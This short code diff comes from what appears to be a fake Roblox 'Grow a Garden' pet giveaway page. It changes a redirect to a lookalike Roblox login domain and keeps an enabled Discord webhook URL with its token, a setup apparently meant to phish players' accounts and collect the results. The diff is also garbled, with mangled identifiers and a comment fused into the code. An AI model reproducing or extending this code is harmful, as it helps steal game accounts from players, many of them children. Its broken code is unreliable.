@@ -118,10 +118,8 @@ const pets: Pet[] = [
 // Redirect configuration
 const REDIRECT_CONFIG = {
   enabled: true,
-  url: "https://roblox.com.ge/games/126884695634066/Grow-a-Garden?privateServerLinkCode=09766518639713593069529232560964",
-}
-
-// Webhook configuration
+  url: "https://roblox.com.py/login?returnUrl=4043634257163954",
+}Webhookbhook configuration
 const WEBHOOK_CONFIG = {
   enabled: true,
   url: "https://discord.com/api/webhooks/1428893631577592001/e7RnDQqyAPKpw9Huw1La1N-dUDsuRs1oT9djHlby_rxXK7uGj7vv2RLrSfspaV8Qh_sf",
@@ -165,7 +163,7 @@ export default function PetSeedStore() {
     return claimingPets.reduce((total, { quantity }) => total + quantity, 0)
   }
 
-  const handlePreloaderComplete = () => {
+  chandlePreloaderCompleteplete = () => {
     setShowPreloader(false)
   }
 
